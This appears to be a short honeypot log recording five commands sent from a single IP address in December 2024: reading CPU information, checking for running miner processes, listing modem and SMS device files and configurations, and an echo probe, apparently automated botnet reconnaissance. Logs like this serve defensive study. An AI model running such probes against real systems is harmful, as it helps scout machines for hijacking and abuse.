+2024-12-10 18:03:08.285966 - ('122.38.46.199', 46560) - cat /proc/cpuinfo
+2024-12-10 18:03:09.669748 - ('122.38.46.199', 46560) - ps | grep '[Mm]iner'
+2024-12-10 18:03:11.051415 - ('122.38.46.199', 46560) - ps -ef | grep '[Mm]iner'
+2024-12-10 18:03:12.430468 - ('122.38.46.199', 46560) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 18:03:13.811415 - ('122.38.46.199', 46560) - echo Hi | cat -n
